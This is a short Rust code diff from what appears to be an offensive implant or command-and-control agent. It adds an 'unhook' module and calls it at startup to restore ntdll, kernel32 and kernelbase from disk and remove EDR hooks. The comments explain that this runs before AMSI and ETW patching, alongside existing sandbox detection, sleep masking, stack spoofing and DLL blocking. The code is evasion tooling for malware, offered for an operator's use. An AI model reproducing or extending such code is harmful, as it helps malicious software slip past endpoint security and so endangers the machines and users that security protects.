@@ -3,6 +3,7 @@ pub mod etw;
 pub mod sandbox;
 pub mod sleep_mask;
 pub mod stack_spoof;
+pub mod unhook;
 
 pub use sandbox::is_sandbox;
 pub use sleep_mask::obfuscated_sleep;
@@ -10,7 +11,15 @@ pub use sleep_mask::obfuscated_sleep;
 use oxide_common::types::SleepObf;
 
 /// Apply all configured process mitigations at startup.
+///
+/// Order matters: unhook must happen BEFORE amsi/etw patches so the patches
+/// land on clean (unhooked) code rather than on bytes an EDR installed.
 pub fn harden(block_dlls: bool) {
+    // 1. Restore ntdll / kernel32 / kernelbase from disk — removes EDR hooks
+    #[cfg(target_os = "windows")]
+    unhook::unhook_all();
+
+    // 2. Block non-Microsoft-signed DLLs (optional, configured by operator)
     #[cfg(target_os = "windows")]
     if block_dlls {
         apply_block_dlls();
